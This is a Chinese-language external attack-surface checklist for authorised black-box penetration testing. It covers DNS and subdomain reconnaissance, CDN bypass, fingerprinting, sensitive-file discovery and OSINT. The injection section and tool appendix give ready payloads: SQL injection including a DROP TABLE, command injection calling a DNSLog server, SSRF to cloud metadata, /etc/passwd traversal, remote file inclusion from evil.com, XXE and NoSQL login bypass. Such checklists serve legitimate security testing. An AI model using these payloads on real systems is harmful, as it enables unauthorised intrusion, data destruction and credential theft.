# 仅凭 URL 可执行的安全审查清单

> 文档版本：v1.0  
> 适用范围：黑盒外部攻击面评估（无需登录、无需源码、无需任何凭证）  
> 参考来源：HackTricks External Recon Methodology、OWASP Testing Guide、安全社区实战经验

---

## 目录

1. [DNS 信息收集 — 发现未知资产](#一dns-信息收集--发现未知资产)
2. [IP & 网络拓扑 — 绕过 CDN 直击源站](#二ip--网络拓扑--绕过-cdn-直击源站)
3. [Web 指纹识别 — 知道你在用什么](#三web-指纹识别--知道你在用什么)
4. [目录 & 文件扫描 — 找到藏起来的东西](#四目录--文件扫描--找到藏起来的东西)
5. [SSL/TLS 证书审查 — 证书链里的秘密](#五ssltls-证书审查--证书链里的秘密)
6. [Web 漏洞被动扫描 — 不触碰也能发现](#六web-漏洞被动扫描--不触碰也能发现)
7. [注入检测 — 最核心的黑盒攻击面](#七注入检测--最核心的黑盒攻击面)
8. [公开情报收集（OSINT）— 社工层面](#八公开情报收集osint--社工层面)
9. [WAF & 防御评估](#九waf--防御评估)
10. [第三方服务暴露检测](#十第三方服务暴露检测)
11. [自动化扫描平台 — 一键聚合](#十一自动化扫描平台--一键聚合)
12. [风险等级速查表](#十二风险等级速查表)

---

## 一、DNS 信息收集 — 发现未知资产

> **目标**：找到所有关联域名和子域名，扩大攻击面

### 1.1 被动子域名枚举

| 操作         | 说明                                  | 工具/平台                                            |
| ---------- | ----------------------------------- | ------------------------------------------------ |
| 查询证书透明度日志  | 从 SSL 证书日志中提取所有子域名                  | [crt.sh](https://crt.sh)、`certspotter`           |
| 搜索引擎爬取     | 搜索引擎索引中收录的子域名                       | `Google dork: site:*.example.com`                |
| DNS 记录查询   | A / AAAA / CNAME / MX / TXT / NS 记录 | `dig any example.com`、`nslookup`                 |
| OSINT 聚合工具 | 从数十个数据源聚合子域名                        | `Subfinder`、`Amass`、`Assetfinder`、`theHarvester` |

**在线平台**：SecurityTrails、RapidDNS、Omnisint

### 1.2 主动子域名发现

| 操作       | 说明                        | 工具                                                  |
| -------- | ------------------------- | --------------------------------------------------- |
| DNS 暴力枚举 | 用字典猜测可能的子域名               | `massdns`、`gobuster dns`、`puredns`、`shuffledns`     |
| DNS 区域传输 | 尝试 DNS 区域传输（AXFR）漏洞       | `dig +axfr @ns.example.com example.com`             |
| DNS 置换爆破 | 通过已知子域名生成排列组合继续爆破         | `dnsgen`、`goaltdns`、`alterx`                        |
| VHost 爆破 | 通过 Host 头暴力枚举同一 IP 上的虚拟主机 | `ffuf -H "Host: FUZZ.example.com"`、`gobuster vhost` |

### 1.3 DNS 历史与被动数据

| 操作        | 说明                   | 工具/平台                       |
| --------- | -------------------- | --------------------------- |
| 历史 DNS 查询 | 域名过去指向的 IP（可绕过 CDN）  | SecurityTrails、PassiveTotal |
| 反向 DNS    | IP 段反向查询找到更多域名       | `dnsrecon -r`               |
| 被动 DNS 数据 | 通过第三方监控数据查找关联 DNS 记录 | RiskIQ、DNSDB                |

### 1.4 子域名劫持检测

| 操作         | 说明                                           | 工具                                         |
| ---------- | -------------------------------------------- | ------------------------------------------ |
| CNAME 指向检测 | 检查子域名是否指向已释放的云服务（AWS S3、Heroku、GitHub Pages） | `subjack`、`subover`、`nuclei -t takeovers/` |

---

## 二、IP & 网络拓扑 — 绕过 CDN 直击源站

> **目标**：找到真实服务器 IP，绘制网络拓扑

### 2.1 IP 解析

| 操作       | 说明                            | 工具/平台                   |
| -------- | ----------------------------- | ----------------------- |
| 当前 IP 解析 | 获取域名的 A / AAAA 记录             | `ping`、`dig`、`nslookup` |
| 历史 IP 记录 | 绕过 CDN 找到源站真实 IP              | SecurityTrails、WhoisXML |
| CDN 绕过   | 利用邮件服务器 MX 记录、子域名、Censys 搜索源站 | `CloudFail`、`bypasscf`  |
| IP 地理位置  | 确定服务器物理位置                     | `ipinfo.io`、MaxMind     |

### 2.2 网络信息

| 操作     | 说明              | 工具/平台                                        |
| ------ | --------------- | -------------------------------------------- |
| ASN 查询 | 查找自治系统号和所属组织    | [bgp.he.net](https://bgp.he.net)、`ipinfo.io` |
| IP 段查询 | 同一组织拥有的全部 IP 范围 | `bgpview.io`、`asnlookup.com`                 |
| C 段扫描  | 同一网段的其他服务器      | Shodan、Censys                                |

### 2.3 端口扫描

| 操作       | 说明                                                         | 工具                   |
| -------- | ---------------------------------------------------------- | -------------------- |
| 全端口扫描    | 1-65535 端口开放情况                                             | `masscan`、`nmap -p-` |
| 常见服务端口   | 22(SSH)、80/443(Web)、3306(MySQL)、6379(Redis)、27017(MongoDB) | `nmap -sV`           |
| UDP 端口扫描 | DNS(53)、SNMP(161) 等 UDP 服务                                 | `nmap -sU`           |

> **注意**：端口扫描属于主动探测，需要确认测试范围授权

---

## 三、Web 指纹识别 — 知道你在用什么

> **目标**：识别技术栈、版本号，对应已知漏洞

### 3.1 HTTP 头分析

| 检测项          | 能从 Header 发现什么                                          | 工具                                                 |
| ------------ | ------------------------------------------------------- | -------------------------------------------------- |
| Server 头     | `nginx/1.18.0`、`Apache/2.4.41` — 精确版本                   | `curl -I`、浏览器 DevTools                             |
| X-Powered-By | `PHP/7.4`、`ASP.NET`、`Express`                           | `curl -I`                                          |
| Set-Cookie   | `PHPSESSID`(PHP)、`JSESSIONID`(Java)、`ASP.NET_SessionId` | 浏览器 DevTools                                       |
| 安全头检测        | 是否缺失 HSTS / CSP / X-Frame-Options 等                     | [securityheaders.com](https://securityheaders.com) |

### 3.2 技术栈识别

| 检测项          | 说明                      | 工具/平台                                    |
| ------------ | ----------------------- | ---------------------------------------- |
| Wappalyzer   | 浏览器扩展，识别框架、CMS、分析工具、CDN | [Wappalyzer](https://www.wappalyzer.com) |
| BuiltWith    | 深入的技术栈分析                | [BuiltWith](https://builtwith.com)       |
| WhatWeb      | 命令行指纹识别                 | `whatweb example.com`                    |
| 页面 Source 分析 | 注释中的版本号、JS 框架特征、构建工具痕迹  | 查看页面源代码                                  |

### 3.3 favicon 分析

| 操作              | 说明                              | 工具                                 |
| --------------- | ------------------------------- | ---------------------------------- |
| Favicon Hash 计算 | 计算 favicon 哈希，在 Shodan 中搜索同类服务器 | `favihash.py`、`httpx -favicon`     |
| Favicon 关联搜索    | 相同 favicon 的站点可能属于同一组织          | Shodan: `http.favicon.hash:<hash>` |

### 3.4 错误页面信息泄露

| 操作     | 说明                      |
| ------ | ----------------------- |
| 触发 404 | 访问不存在的路径，看是否暴露绝对路径      |
| 触发 500 | 构造畸形请求，看是否暴露堆栈跟踪 / 框架版本 |
| 触发 403 | 访问受限目录，看响应头信息           |

---

## 四、目录 & 文件扫描 — 找到藏起来的东西

> **目标**：发现未预期的可访问路径和敏感文件

### 4.1 目录爆破

| 操作       | 说明                                                               | 工具                                |
| -------- | ---------------------------------------------------------------- | --------------------------------- |
| 敏感目录枚举   | `/admin/`、`/backup/`、`/uploads/`、`/api/`、`/swagger/`、`/console/` | `dirsearch`、`gobuster dir`、`ffuf` |
| 管理后台     | `/admin/`、`/dashboard/`、`/manager/`、`/wp-admin/`                 | 同上                                |
| API 端点发现 | `/api/v1/`、`/graphql`、`/swagger.json`、`/openapi.json`            | `kiterunner`                      |
| 大文件扫描    | 日志文件、数据库备份等                                                      | 大字典 + `ffuf`                      |

### 4.2 敏感文件泄露

| 文件                         | 泄露内容                     | 风险等级  |
| -------------------------- | ------------------------ | ----- |
| `.git/config`              | 完整源码泄露                   | 🔴 高危 |
| `.env`                     | 数据库密码、API Key、Secret Key | 🔴 高危 |
| `robots.txt`               | 管理员不想被爬虫收录的敏感路径          | 🟡 参考 |
| `sitemap.xml`              | 站点所有 URL 路径              | 🟡 参考 |
| `crossdomain.xml`          | Flash 跨域策略（允许任意域时为漏洞）    | 🟠 中危 |
| `phpinfo.php`              | PHP 配置、环境变量（可能含凭据）       | 🔴 高危 |
| `db_backup.sql`            | 数据库完整数据                  | 🔴 高危 |
| `.DS_Store`                | macOS 目录结构信息             | 🟡 低危 |
| `nginx.conf` / `.htaccess` | 服务器配置文件                  | 🟠 中危 |
| `WEB-INF/web.xml` (Java)   | Java Web 配置信息            | 🟠 中危 |

### 4.3 源代码泄露

| 操作           | 说明                                | 工具                    |
| ------------ | --------------------------------- | --------------------- |
| Git 泄露       | `.git/` 目录暴露，可完整下载源码              | `gitdumper`、`GitHack` |
| SVN 泄露       | `.svn/` 目录暴露代码版本信息                | `dvcs-ripper`         |
| 备份文件         | `.bak`、`.old`、`.swp`、`~` 结尾的编辑器备份 | 字典扫描                  |
| JS Sourcemap | `.map` 文件暴露前端源码                   | 浏览器 Source 面板         |

---

## 五、SSL/TLS 证书审查 — 证书链里的秘密

> **目标**：发现证书相关问题，获取更多域名

### 5.1 证书透明度日志

| 操作      | 说明                      | 平台                                 |
| ------- | ----------------------- | ---------------------------------- |
| 子域名提取   | 从证书透明度日志拉取所有关联域名        | [crt.sh](https://crt.sh)           |
| 通配符证书分析 | `*.example.com` 覆盖的所有域名 | 同上                                 |
| 历史证书    | 已失效或已更换的旧证书中的域名         | [Censys](https://search.censys.io) |

### 5.2 TLS 配置审查

| 检测项  | 说明                                  | 工具                                           |
| ---- | ----------------------------------- | -------------------------------------------- |
| 协议版本 | 是否支持 TLS 1.0 / 1.1（已废弃，有降级攻击风险）     | [SSL Labs](https://www.ssllabs.com/ssltest/) |
| 密码套件 | 是否使用 RC4、3DES、CBC 模式等弱加密            | `testssl.sh`                                 |
| 证书链  | 是否完整、是否包含中间证书                       | `openssl s_client`                           |
| 证书过期 | 是否已过期或即将过期                          | `curl -vI`                                   |
| HSTS | 是否启用 HTTP Strict Transport Security | `curl -I` > 检查 `Strict-Transport-Security`   |

---

## 六、Web 漏洞被动扫描 — 不触碰也能发现

> **目标**：仅通过分析响应就能发现配置问题

### 6.1 安全头检查

| 安全头                               | 作用                  | 缺失风险         |
| --------------------------------- | ------------------- | ------------ |
| `Strict-Transport-Security`       | 强制 HTTPS 访问         | 中间人攻击        |
| `X-Content-Type-Options: nosniff` | 禁止 MIME 嗅探          | 文件上传 XSS     |
| `X-Frame-Options: DENY`           | 禁止页面被嵌入 iframe      | Clickjacking |
| `Content-Security-Policy`         | 限制资源加载源             | XSS 难以防御     |
| `X-XSS-Protection`                | 浏览器 XSS 过滤器（已废弃但仍有） | —            |
| `Referrer-Policy`                 | 控制 Referer 发送策略     | 隐私信息泄露       |
| `Permissions-Policy`              | 限制浏览器 API 访问        | —            |

**在线检测**：[securityheaders.com](https://securityheaders.com)

### 6.2 CORS 配置检查

| 测试          | 操作                                                               | 风险             |
| ----------- | ---------------------------------------------------------------- | -------------- |
| 通配符 Origin  | `Access-Control-Allow-Origin: *`                                 | 任意域可跨域读取数据     |
| Origin 反射   | 发送 `Origin: evil.com` 返回 `Access-Control-Allow-Origin: evil.com` | 凭证劫持           |
| 未限制 Methods | `Access-Control-Allow-Methods: *`                                | 可执行意外的 HTTP 方法 |

```bash
# 测试 CORS 配置
curl -H "Origin: https://evil.com" -H "Referer: https://evil.com" https://example.com/api -I
```

### 6.3 表单与提交安全

| 检测项        | 说明                        |
| ---------- | ------------------------- |
| 登录页是否 HTTP | 登录表单从 HTTP 页面提交 → 明文密码    |
| 表单是否 HTTPS | 表单 `action` 是否指向 HTTPS    |
| 自动填充       | 密码框是否有 `autocomplete=off` |

### 6.4 第三方依赖检查

| 检测项                   | 说明                               |
| --------------------- | -------------------------------- |
| 引入的 JS 库版本            | 是否有已知漏洞（如旧版 jQuery、React）        |
| 外部 CDN 资源             | 是否依赖第三方 CDN 提供的脚本                |
| Subresource Integrity | `<script>` 标签是否包含 `integrity` 属性 |

---

## 七、注入检测 — 最核心的黑盒攻击面

> **目标**：通过 URL 参数 / 请求构造，直接发现可利用漏洞

### 7.1 SQL 注入

| 类型           | 测试方式                                                | 判断依据                    |
| ------------ | --------------------------------------------------- | ----------------------- |
| **基础探测**     | `?id=1'`、`?id=1"`、`?id=1)`、`?id=1;`                 | 500 错误 / 数据库错误信息 / 页面空白 |
| **布尔盲注**     | `?id=1 AND 1=1` vs `?id=1 AND 1=2`                  | 两个请求页面表现不同              |
| **时间盲注**     | `?id=1 AND SLEEP(5)`、`?id=1; WAITFOR DELAY '0:0:5'` | 响应延迟 >5s                |
| **报错注入**     | `?id=1 AND extractvalue(1,CONCAT(0x7e,database()))` | 报错信息中回显数据库名             |
| **Union 注入** | `?id=-1 UNION SELECT 1,2,3--`                       | 页面特定位置回显出数字             |
| **堆叠注入**     | `?id=1; DROP TABLE users--`                         | 多条语句执行效果                |
| **二次注入**     | 先插入恶意数据（如注册），后续页面触发                                 | 触发位置不在原参数               |

**常用工具**：`sqlmap -u "http://..."`（自动化检测 + 利用）

### 7.2 NoSQL 注入（MongoDB）

| 测试方式                                        | 判断依据          |
| ------------------------------------------- | ------------- |
| `?username[$ne]=admin&password[$ne]=admin`  | 绕过登录认证        |
| `?id[$gt]=`                                 | 返回所有大于空字符串的数据 |
| POST JSON Body: `{"username": {"$gt": ""}}` | 绕过认证          |

### 7.3 XSS（跨站脚本）

| 类型         | 测试方式                                                             | 判断依据                     |
| ---------- | ---------------------------------------------------------------- | ------------------------ |
| **反射型**    | `?q=<script>alert(1)</script>`、`?q=<img src=x onerror=alert(1)>` | 参数值原样出现在 HTML 中          |
| **DOM 型**  | URL 片段 `#<script>alert(1)</script>`                              | JS 从 URL 取值后直接 innerHTML |
| **上下文特异性** | `<script>` 标签内、HTML 属性内、CSS 内、URL 内                              | 不同上下文需要不同 payload        |

### 7.4 命令注入

| 测试方式                                           | 判断依据              |
| ---------------------------------------------- | ----------------- |
| `?ip=127.0.0.1;id`、`?ip=127.0.0.1              | whoami`           |
| `?ip=127.0.0.1;sleep 5`                        | 响应延迟 5s           |
| `?ip=127.0.0.1;curl http://your-dnslog-server` | DNSLog 收到请求（带外检测） |

### 7.5 SSRF（服务端请求伪造）

| 测试方式                                            | 判断依据                 |
| ----------------------------------------------- | -------------------- |
| `?url=http://127.0.0.1:3306`                    | 返回 MySQL 服务 banner   |
| `?url=http://169.254.169.254/latest/meta-data/` | 获取云服务临时凭据（AWS 元数据端点） |
| `?url=http://[::1]:80`                          | IPv6 本地回环            |
| `?url=file:///etc/passwd`                       | 读取本地文件               |

### 7.6 路径遍历 / 文件包含

| 测试方式                                                          | 判断依据                |
| ------------------------------------------------------------- | ------------------- |
| `?file=../../../etc/passwd`                                   | 返回 `/etc/passwd` 内容 |
| `?file=....//....//....//etc/passwd`                          | 绕过简单过滤              |
| `?file=php://filter/convert.base64-encode/resource=index.php` | PHP 伪协议读取源码         |
| `?page=http://evil.com/shell.txt`                             | 远程文件包含（RFI）         |

### 7.7 模板注入（SSTI）

| 测试方式               | 对应模板引擎                |
| ------------------ | --------------------- |
| `?name={{7*7}}`    | Jinja2 / Twig / Go    |
| `?name=${7*7}`     | Freemarker / Velocity |
| `?name=<%= 7*7 %>` | ERB                   |
| `?name=${{7*7}}`   | 返回 `49` 即存在注入         |

### 7.8 XML 外部实体（XXE）

| 测试方式                                                       | 判断依据       |
| ---------------------------------------------------------- | ---------- |
| Request Body 含 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 文件内容回显在响应中 |
| OOB 方式配合 DNSLog                                            | 出口方向收到请求   |

### 7.9 IDOR / 越权

| 测试方式                            | 判断依据     |
| ------------------------------- | -------- |
| `?user_id=123` → `?user_id=124` | 看到其他用户数据 |
| 普通用户访问 `/admin/`                | 未授权访问    |
| 修改 JWT Token 中的用户标识             | 越权操作     |

### 7.10 开放重定向

| 测试方式                        | 判断依据            |
| --------------------------- | --------------- |
| `?redirect=http://evil.com` | 被跳转到恶意站         |
| `?next=//evil.com`          | 绕过 `http://` 检测 |
| `?url=//attacker.com`       | 302 或 JS 跳转     |

### 7.11 文件上传漏洞

| 测试方式                     | 判断依据                          |
| ------------------------ | ----------------------------- |
| 直接访问 `/uploads/evil.php` | 知道上传路径后可判断                    |
| 测试 Content-Type 校验绕过     | 修改 `Content-Type: image/jpeg` |
| 测试扩展名校验绕过                | `.php.jpg`、`.php5`、`.phtml`   |

---

## 八、公开情报收集（OSINT）— 社工层面

> **目标**：从互联网公开信息中收集凭据、关联资产

### 8.1 Whois 信息

| 查询项          | 能发现什么           | 平台                                   |
| ------------ | --------------- | ------------------------------------ |
| 注册人信息        | 姓名、邮箱、电话、地址     | `whois`、[who.is](https://who.is)     |
| 域名注册/过期日期    | 域名续费计划、是否可能被抢注  | 同上                                   |
| 注册商信息        | 域名服务商           | 同上                                   |
| **反向 Whois** | 用同一邮箱/姓名查到的其他域名 | [viewdns.info](https://viewdns.info) |

### 8.2 Google Dorking

| 搜索语法                                       | 发现什么          |
| ------------------------------------------ | ------------- |
| `site:example.com filetype:sql`            | SQL 备份文件      |
| `site:example.com "password"`              | 页面中含密码信息的页面   |
| `site:example.com inurl:admin`             | 管理后台          |
| `site:example.com ext:log`                 | 日志文件          |
| `site:github.com "example.com" "password"` | GitHub 上泄露的凭据 |
| `site:example.com intitle:"index of"`      | 目录列表          |

### 8.3 数据泄露查询

| 平台                                              | 说明            |
| ----------------------------------------------- | ------------- |
| [Have I Been Pwned](https://haveibeenpwned.com) | 查询邮箱是否在已知泄露中  |
| [DeHashed](https://dehashed.com)                | 凭据泄露数据库搜索     |
| [Firefox Monitor](https://monitor.firefox.com)  | Mozilla 泄露监控  |
| 暗网 / Telegram 频道                                | 爬虫泄露数据（需专门工具） |

### 8.4 历史快照

| 平台                                          | 说明                                         |
| ------------------------------------------- | ------------------------------------------ |
| [Wayback Machine](https://archive.org/web/) | 网站历史快照，查看已删除但仍有风险的页面                       |
| [gau](https://github.com/lc/gau)            | 从 AlienVault、Wayback、Common Crawl 抓取历史 URL |
| [CC Search](https://commoncrawl.org)        | 通用爬虫数据                                     |

### 8.5 跟踪器关联分析

| 检测项                 | 说明                                                                                                     |
| ------------------- | ------------------------------------------------------------------------------------------------------ |
| Google Analytics ID | 同一 GA ID 可能关联多个站点                                                                                      |
| Adsense ID          | 同一广告账号下的所有站点                                                                                           |
| Facebook Pixel ID   | 关联分析                                                                                                   |
| 工具                  | [SpyOnWeb](https://spyonweb.com)、[BuiltWith](https://builtwith.com)、[PublicWWW](https://publicwww.com) |

### 8.6 Paste 站点监控

| 平台                                          | 说明                 |
| ------------------------------------------- | ------------------ |
| [Pastebin](https://pastebin.com)            | 公开粘贴内容（API Key、凭据） |
| [Pastos](https://github.com/vlad-s/Melting) | 聚合 80+ 粘贴站点的搜索工具   |

---

## 九、WAF & 防御评估

> **目标**：了解目标使用了哪些防御措施

### 9.1 WAF 识别

| 检测项      | 说明                                                        |
| -------- | --------------------------------------------------------- |
| WAF 厂商识别 | CloudFlare、AWS WAF、ModSecurity、F5、Akamai、Imperva          |
| 检测工具     | [wafw00f](https://github.com/EnableSecurity/wafw00f)      |
| 响应特征     | CloudFlare 的 `cf-ray` Header、AWS WAF 的 `x-amzn-RequestId` |

### 9.2 速率限制测试

| 检测项        | 方法                               |
| ---------- | -------------------------------- |
| 是否存在速率限制   | 快速发送大量请求 → 429 Too Many Requests |
| IP 黑名单机制   | 多 IP 轮换测试                        |
| CAPTCHA 触发 | 异常请求后是否出现验证码                     |

### 9.3 Honeypot 检测

| 检测项    | 说明                              |
| ------ | ------------------------------- |
| 隐藏表单字段 | 页面中 `display:none` 的表单字段（对爬虫可见） |
| 假链接    | 只有爬虫会访问的隐藏链接                    |
| JS 挑战  | 需执行 JS 才能看到真实页面内容               |

---

## 十、第三方服务暴露检测

> **目标**：找到在第三方平台上暴露的服务和资产

### 10.1 云存储桶（Bucket）枚举

| 云平台                  | 检测方式                                                              |
| -------------------- | ----------------------------------------------------------------- |
| AWS S3               | 枚举 `{company}-backup.s3.amazonaws.com`、`{company}-uploads`        |
| Google Cloud Storage | `{company}-data.storage.googleapis.com`                           |
| Azure Blob           | `{company}prod.blob.core.windows.net`                             |
| **检查权限**             | 匿名列出/读写权限                                                         |
| **工具**               | `s3scanner`、[Grayhat Warfare](https://buckets.grayhatwarfare.com) |

### 10.2 CI/CD 暴露

| 服务           | 检测方式                                       |
| ------------ | ------------------------------------------ |
| Jenkins      | 子域名 `jenkins.example.com` + 路径 `/jenkins/` |
| GitLab       | 子域名 `gitlab.example.com`                   |
| GitHub Pages | `organization.github.io`                   |
| Travis CI    | 公开构建日志可能含凭据                                |

### 10.3 数据库公网暴露

| 服务            | 默认端口  | Shodan 搜索                         |
| ------------- | ----- | --------------------------------- |
| MongoDB       | 27017 | `MongoDB` + `org:"Company"`       |
| Elasticsearch | 9200  | `Elasticsearch` + `org:"Company"` |
| Redis         | 6379  | `redis` + `org:"Company"`         |
| MySQL         | 3306  | `MySQL` + `org:"Company"`         |
| PostgreSQL    | 5432  | `PostgreSQL` + `org:"Company"`    |

### 10.4 Docker / Kubernetes 暴露

| 检测项            | 说明                  |
| -------------- | ------------------- |
| Docker API     | TCP 2375/2376 未授权访问 |
| Kubernetes API | 6443 端口暴露           |
| etcd           | 2379 端口暴露（K8s 关键数据） |
| Kubelet        | 10250 未授权           |

---

## 十一、自动化扫描平台 — 一键聚合

> **目标**：一站获取尽可能多的信息

| 平台                                           | 输入       | 输出                                     |
| -------------------------------------------- | -------- | -------------------------------------- |
| [urlscan.io](https://urlscan.io)             | URL      | 完整 DOM 树、所有请求、JS/CSS 列表、Cookie、域名关联、截图 |
| [Shodan](https://shodan.io)                  | IP / 域名  | 所有开放端口、服务 banner、设备类型、地理位置             |
| [Censys](https://search.censys.io)           | IP / 域名  | TLS 证书、协议详情、ASN 信息                     |
| [SecurityTrails](https://securitytrails.com) | 域名       | DNS 历史、子域名、关联域名、IP 历史                  |
| [VirusTotal](https://virustotal.com)         | 域名 / URL | 关联域名、子域名、文件检测、社区备注                     |
| [FOFA](https://fofa.info)                    | 域名 / IP  | 网络空间搜索引擎（国内）                           |
| [ZoomEye](https://zoomeye.org)               | 域名 / IP  | 网络空间搜索引擎（国内）                           |
| [DNSDumpster](https://dnsdumpster.com)       | 域名       | DNS 记录地图 + 子域名                         |

---

## 十二、风险等级速查表

| 风险等级              | 攻击者能做什么                                                       |
| ----------------- | ------------------------------------------------------------- |
| 🔴 **高危 — 直接利用**  | 找到真实 IP、开放高危端口(SSH/MySQL/Redis)、SQL 注入可拖库、备份文件可下载、Session 可伪造 |
| 🟠 **中危 — 扩大攻击面** | 发现未预期的子域名、管理后台路径、API 端点、CORS 配置缺陷、HTTPS 配置问题                  |
| 🟡 **低危 — 情报收集**  | 确定技术栈版本、开发人员邮箱、DNS 历史记录、第三方关联资产                               |
| ⚪ **社工辅助**        | Whois 信息暴露真实姓名/邮箱、Pastebin 泄露凭据、GitHub 泄露内部代码                 |

---

## 附录 A：常用工具速查

```bash
# ─── DNS 信息收集 ───
dig any example.com
dnsrecon -d example.com
subfinder -d example.com
amass enum -d example.com
massdns -r resolvers.txt -t A -o S -w output.txt domains.txt

# ─── 子域名爆破 ───
gobuster dns -d example.com -w subdomains.txt -t 50
puredns bruteforce wordlist.txt example.com

# ─── 端口扫描 ───
nmap -sS -sV -p- example.com
masscan -p1-65535 --rate=1000 example.com

# ─── 目录扫描 ───
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
dirsearch -u https://example.com
ffuf -u https://example.com/FUZZ -w wordlist.txt

# ─── 指纹识别 ───
whatweb example.com
wappalyzer  # 浏览器扩展

# ─── WAF 识别 ───
wafw00f https://example.com

# ─── SQL 注入 ───
sqlmap -u "https://example.com/page?id=1" --batch

# ─── 目录穿越 ───
ffuf -u "https://example.com/page?file=FUZZ" -w lfi-wordlist.txt

# ─── HTTP 头检查 ───
curl -sI https://example.com | grep -i -E 'strict|frame|csp|cto|hsts'

# ─── CRT 日志查询 ───
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# ─── 历史 URL ───
gau --subs example.com
waybackurls example.com
```

---

## 附录 B：在线检测平台速查

| 类型        | 平台                | 网址                                 |
| --------- | ----------------- | ---------------------------------- |
| 安全头检测     | Security Headers  | https://securityheaders.com        |
| SSL 检测    | SSL Labs          | https://www.ssllabs.com/ssltest/   |
| 子域名查询     | crt.sh            | https://crt.sh                     |
| 子域名查询     | DNSDumpster       | https://dnsdumpster.com            |
| IP 信息     | ipinfo.io         | https://ipinfo.io                  |
| ASN/IP 段  | BGP HE            | https://bgp.he.net                 |
| 历史快照      | Wayback Machine   | https://archive.org/web/           |
| URL 分析    | urlscan.io        | https://urlscan.io                 |
| 资产搜索      | Shodan            | https://shodan.io                  |
| 资产搜索      | Censys            | https://search.censys.io           |
| 历史 DNS    | SecurityTrails    | https://securitytrails.com         |
| 技术栈识别     | BuiltWith         | https://builtwith.com              |
| Bucket 搜索 | Grayhat Warfare   | https://buckets.grayhatwarfare.com |
| 泄露查询      | Have I Been Pwned | https://haveibeenpwned.com         |
| 反向 Whois  | ViewDNS           | https://viewdns.info               |

---

> **免责声明**：本清单仅供安全研究和授权的渗透测试使用。对未授权的系统进行任何探测行为均可能违反法律法规。
